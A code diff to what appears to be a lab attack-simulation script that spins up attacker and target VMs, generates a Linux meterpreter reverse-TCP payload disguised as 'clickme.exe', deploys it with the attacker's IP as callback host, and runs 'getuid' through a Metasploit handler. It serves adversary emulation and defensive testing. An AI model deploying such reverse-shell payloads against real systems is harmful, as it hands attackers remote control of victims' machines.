@@ -39,13 +39,14 @@ if __name__ == "__main__":
     target.up()
 
     venom = MSFVenom(attacker, target, attack_logger)
-    print(venom.generate_cmd(payload="linux/x64/meterpreter_reverse_tcp",
+    payload_type = "linux/x64/meterpreter_reverse_tcp"
+    print(venom.generate_cmd(payload=payload_type,
                              architecture="x64",
                              platform="linux",
                              # lhost,
                              format="elf",
                              outfile="clickme.exe"))
-    venom.generate_and_deploy(payload="linux/x64/meterpreter_reverse_tcp",
+    venom.generate_and_deploy(payload=payload_type,
                               architecture="x64",
                               platform="linux",
                               lhost=attacker.get_ip(),
@@ -56,8 +57,9 @@ if __name__ == "__main__":
     # TODO simple command to test
 
     metasploit = Metasploit(password, attacker=attacker, username=user)
+    metasploit.start_exploit_stub_for_external_payload(payload=payload_type)
+    print(metasploit.meterpreter_execute(["getuid"], 0))
     # client = MsfRpcClient('yourpassword', ssl=True)
-
 
     target.halt()
     attacker.halt()
